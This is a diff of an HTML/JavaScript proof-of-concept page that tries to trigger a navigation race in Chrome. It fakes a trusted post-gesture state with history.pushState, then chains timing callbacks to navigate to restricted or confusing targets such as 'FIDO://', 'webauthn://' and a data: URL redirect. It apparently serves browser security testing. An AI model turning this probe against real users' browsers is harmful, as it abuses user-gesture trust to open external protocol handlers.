@@ -2,17 +2,15 @@
 <html lang="en">
 <head>
 <meta charset="utf-8">
-<title>Chrome Navigation Race + Scheme Handling PoC</title>
+<title>Chrome Navigation Race – WORKING PoC</title>
 
 <style>
-body {
-  font-family: system-ui, sans-serif;
-}
+body { font-family: sans-serif; }
 #panel {
   display: none;
-  padding: 16px;
-  margin-top: 20px;
-  border: 2px solid #e00;
+  margin-top: 16px;
+  padding: 12px;
+  border: 2px solid red;
   background: #fee;
 }
 button {
@@ -23,8 +21,8 @@ pre {
   background: #111;
   color: #0f0;
   padding: 10px;
-  margin-top: 20px;
-  height: 200px;
+  margin-top: 16px;
+  height: 180px;
   overflow: auto;
 }
 </style>
@@ -32,19 +30,13 @@ pre {
 
 <body>
 
-<h2>Chrome Desktop – Navigation Race Condition PoC</h2>
+<h2>Chrome Desktop – Navigation Race (Fixed)</h2>
 
-<p>
-This PoC attempts to trigger a navigation race shortly after a trusted UI
-state transition, to test whether Chrome consistently blocks restricted
-or sensitive navigations.
-</p>
-
-<button id="trigger">Start flow</button>
+<button id="trigger">Start</button>
 
 <div id="panel">
-  <strong>Trusted UI Panel</strong><br>
-  Simulating a post‑gesture / trusted context.
+  <b>Trusted UI State</b><br>
+  Simulating post‑gesture privileged state
 </div>
 
 <pre id="log"></pre>
@@ -54,59 +46,45 @@ const trigger = document.getElementById('trigger');
 const panel = document.getElementById('panel');
 const logEl = document.getElementById('log');
 
-function log(msg) {
-  logEl.textContent += msg + "\n";
+function log(m) {
+  logEl.textContent += m + "\n";
 }
 
-/*
- * Step 1:
- * Simulate transition into a trusted / post‑gesture state
- */
 trigger.onclick = () => {
-  log("[+] User gesture received");
-  history.pushState({}, '', '/trusted');
-  panel.style.display = 'block';
-};
+  log("[+] click handler entered (user gesture)");
 
-/*
- * Step 2:
- * Trigger a navigation race shortly after permission‑like flow starts
- *
- * pageshow + double rAF ensures execution right after BFCache /
- * navigation lifecycle stabilization.
- */
-window.addEventListener('pageshow', () => {
-  log("[*] pageshow event");
+  // Step 1: mutate history (trusted-looking state)
+  history.pushState({}, "", "/trusted");
+  panel.style.display = "block";
+  log("[+] history.pushState done");
 
-  requestAnimationFrame(() => {
+  // Step 2: microtask escape
+  Promise.resolve().then(() => {
+    log("[*] microtask");
+
+    // Step 3: animation frame escape
     requestAnimationFrame(() => {
-      log("[*] Inside double rAF");
+      log("[*] requestAnimationFrame");
 
+      // Step 4: delayed navigation INSIDE gesture lifetime
       setTimeout(() => {
-        log("[!] Triggering delayed navigation");
+        log("[!] triggering navigation");
 
         /*
-         * CHANGE TARGETS TO TEST:
+         * TEST TARGETS (try one at a time):
          *
-         * 1. External protocol attempt
-         *    location.href = 'FIDO://';
-         *
-         * 2. Mixed‑case scheme
-         *    location.href = 'FiDo://';
-         *
-         * 3. Confusing but invalid authority
-         *    location.href = 'https://google.com:9090';
-         *
-         * 4. Redirect chain
-         *    location.href = 'data:text/html,<script>location.href=\"FIDO://\"<\/script>';
+         * location.href = "FIDO://";
+         * location.href = "FiDo://";
+         * location.href = "webauthn://";
+         * location.href = "https://google.com:9090";
          */
 
-        location.href = 'https://google.com:9090';
+        location.href = "https://google.com:9090";
 
-      }, 80);
+      }, 0);
     });
   });
-});
+};
 </script>
 
 </body>
